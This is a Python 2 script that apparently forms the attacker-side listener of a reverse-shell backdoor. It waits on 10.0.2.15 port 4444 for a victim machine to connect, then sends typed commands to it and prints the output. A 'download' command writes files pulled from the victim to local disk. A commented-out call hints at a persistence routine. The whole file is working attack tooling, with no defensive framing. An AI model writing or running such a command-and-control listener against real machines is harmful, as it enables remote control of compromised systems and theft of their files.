#!/usr/bin/env python

import socket,json,base64,shutil

class Listener:

    def __init__(self,ip,port):        
       # self.become_persistent()
        listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        #we can reuse a socket
        listner.bind((ip,port))
        listner.listen(0)
        print("[+]Waitng for conention")
        self.connection ,address = listner.accept()
        print("got a conenction from"+str(address))
        

    def execute_remotely(self,command):
        self.connection.send(command)
        if command=="exit":
            self.connection.close()
            exit()
        
        return self.connection.recv(10024)

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download scuessfully"


    def run(self):
        while True:
            command = raw_input(">> ")
            try:
                result= self.execute_remotely(command)
                command=command.split(" ")
                if command[0]=="download" and "[-] Eror " not in result:
                    result=self.write_file(command[1],result)
            except Exception:
                result= "[-] Eror in scommand execution"
            print(result)

my_listener= Listener("10.0.2.15",4444)
my_listener.run()